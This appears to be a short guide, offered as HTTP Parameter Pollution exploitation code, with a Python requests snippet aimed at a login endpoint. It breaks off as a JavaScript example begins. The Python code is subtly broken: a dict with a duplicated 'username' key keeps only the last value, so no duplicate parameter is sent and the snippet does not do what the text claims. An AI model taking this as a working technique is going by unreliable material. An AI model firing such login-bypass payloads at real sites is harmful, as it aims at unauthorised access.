# HTTP Parameter Pollution (HPP) Exploitation Code

HTTP Parameter Pollution (HPP) is a technique where multiple parameters with the same name are sent to a server, potentially bypassing input validation or WAF rules. Here are examples in different languages:

## Python (using requests)

```python
import requests

# Target URL with vulnerable parameter
url = "https://example.com/login"

# Payload with duplicate parameters
payload = {
    "username": "admin",
    "password": "password123",
    "username": "attacker"  # Second parameter with same name
}

# Send the request
response = requests.get(url, params=payload)

print("Response status code:", response.status_code)
print("Response content:", response.text)
```

## JavaScript (using fetch API)

```javascript
// Target URL with vulnerable parameter
